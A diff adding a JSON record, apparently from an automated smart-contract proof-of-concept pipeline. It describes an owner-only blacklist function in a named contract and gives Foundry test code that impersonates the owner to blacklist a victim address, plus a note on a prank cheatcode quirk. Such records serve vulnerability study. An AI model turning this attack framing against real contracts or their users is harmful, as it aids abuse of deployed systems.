@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The target contract at 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112 contains a centralization risk where the owner can unilaterally blacklist any address. The `addBots` function, protected by an `onlyOwner` modifier, allows the owner to add addresses to a blacklist, effectively blocking their interaction.",
+  "interface_arsenal": "interface Ilpp {\n    function addBots(address[] memory _botAddress, bool _status) external;\n    function owner() external view returns (address);\n}",
+  "attack_sequence": "address owner = target.owner();\nvm.startPrank(owner);\naddress[] memory bots = new address[](1);\nbots[0] = VICTIM_ADDRESS;\ntarget.addBots(bots, true);\nvm.stopPrank();",
+  "winning_reflection": "The vulnerability is a direct owner privilege function. The key to a successful PoC was resolving a test environment issue. A single-line `vm.prank` call caused an unexplained revert, but switching to a `vm.startPrank`/`vm.stopPrank` block for the same owner-impersonated call executed successfully, highlighting a subtle difference in how the Foundry testing framework handles state for different cheatcodes."
+}
